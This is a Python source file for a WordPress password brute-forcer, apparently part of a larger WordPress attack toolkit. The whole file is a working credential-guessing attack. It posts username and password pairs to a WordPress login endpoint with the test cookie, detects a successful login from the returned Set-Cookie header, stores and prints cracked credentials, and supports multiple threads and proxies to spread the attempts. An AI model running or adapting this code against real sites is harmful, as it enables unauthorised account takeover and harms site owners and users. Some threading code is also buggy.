import threading
from Lib.queue import Queue as BlockingQueue
from concurrent.futures.thread import ThreadPoolExecutor
from http_handler.http_handler import HTTPRequest
from wordpress.wplogs import WPLogs


class WPPassBruteforcer(object):

    _DEFAULT_TUPLE_INDEX = 0
    _DEFAULT_DICT_COOKIE = 'set-cookie'
    _SUCCESS = 'httponly'
    _NUM_OF_THREADS = 1
    _SHUT_DOWN_KEY = -1
    _ERROR_MSG = "Error"
    _ERROR_LIMIT = 10

    def __init__(self, domain, additional_data=None, proxies=None):
        self._url = domain
        self._additional_data = additional_data
        self._proxies = proxies
        self._http = HTTPRequest()
        self._log = WPLogs()
        self._cracked_data = dict()
        self._username_q = BlockingQueue()
        self._passwords = set()
        self._is_running = False
        self._active_thread = threading.active_count()
        self._errors = 0

    def __run(self):
        try:
            while not self._username_q.empty():
                if self.__is_errors_exceeded_the_limit(False) is True:
                    break
                username = self._username_q.get(block=False)
                check_if_cracked = self.__is_cracked(username)
                if check_if_cracked is not False:
                    if self.__try(username, check_if_cracked) is True:
                        continue
                self.__crack(username, self._passwords)
        except Exception as e:
            self.__save_log(e, "Error: Thread (" + threading.current_thread().getName() + ") has crushed.")

    def __insert_Q(self, username_list=None, single=None):
        try:
            if username_list is not None:
                for usr in username_list:
                    self._username_q.put(usr)
            if single is not None:
                self._username_q.put(usr)
        except Exception as e:
            self.__save_log(e, "Error: cannot put to the username_q")

    def bruteforce(self, usernames, passwords, threads=_NUM_OF_THREADS, proxies=None):
        executor = ThreadPoolExecutor(max_workers=threads)
        try:
            if self._is_running is True:
                print("Brute Force is running - please wait.")
                return None
            self._is_running = True
            self._errors = 0
            self.__insert_Q(username_list=usernames)
            self._passwords = set(passwords)
            if proxies is not None:
                self._proxies = proxies
            active_threads = threading.active_count()
            for i in range(0, threads):
                executor.submit(self.__run())
            self.__run()
        except Exception as e:
            self.__save_log(e, "Error: executor has crushed, threads created: "+str((threading.active_count()-active_threads)))
        finally:
            if threading.active_count()-active_threads > 0:
                executor.shutdown(wait=True)
            self._is_running = False
            self.__is_errors_exceeded_the_limit(True)

        return self.get_cracked_data()

    def get_cracked_data(self):
        return self._cracked_data

    def is_method_possible(self):
        raise NotImplementedError()

    def test(self):
        self.__try("admin", "123")

    def __crack(self, username, passwords):
        try:
            if self.__is_cracked(username) is True:
                return None
            for pwd in passwords:
                if self.__is_errors_exceeded_the_limit(False) is True:
                    return self._ERROR_MSG
                res = self.__try(username, pwd)
                if res is True:
                    self.__save(username, pwd)
                    print("Cracked: "+username+": "+pwd)
                    return None
                elif res is False:
                    print("Not Cracked: "+username+": "+pwd)
                elif res is self._ERROR_MSG:
                    print("Could not reach the login page or the site cookies: "+username+": "+pwd)
                    self._errors += 1
        except Exception as e:
            self.__save_log(e, "Error: __crack method crashed for username: "+username)

    def __try(self, username, password):
        try:
            headers = {'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1' }
            response = self._http.request(self._url, "POST", parameters=parameters, type="http_lib", headers=headers, proxies=self._proxies)
            if response is not None:
                if str(response[self._DEFAULT_TUPLE_INDEX][self._DEFAULT_DICT_COOKIE].split(" ")[-1]).lower() == self._SUCCESS:
                    return True
        except Exception as e:
            self.__save_log(e, "Error: brute force failed for "+username+":"+password)
            return self._ERROR_MSG

        return False

    def __save(self, username, password):
        try:
            self._cracked_data[username] = password
        except Exception as e:
            self.__save_log(e, "Error: save cracked user_name & pass failed for "+username+":"+password)

    def __save_log(self, exception, message=None):
        try:
            self._log.save_log(exception)
            if message is not None:
                self._log.save_log(message)
                print(message)
        except:
            print("Error: saving log is failed.")

    def __is_cracked(self, username):
        try:
            res = self._cracked_data[username]
            return res
        except:
            return False

    def __is_errors_exceeded_the_limit(self, print_error=False):
        result = False
        if self._errors >= self._ERROR_LIMIT:
            result = True
            if print_error is True:
                print("The number of errors has exceeded the limit, please check the parameters given"
                      " - they probably do not allow strong force for this site.")
        return result




    # Feel free to add public method that you consider to be relevant for the users
    # user _ and __ for private and protected methods that should not be used outside the class
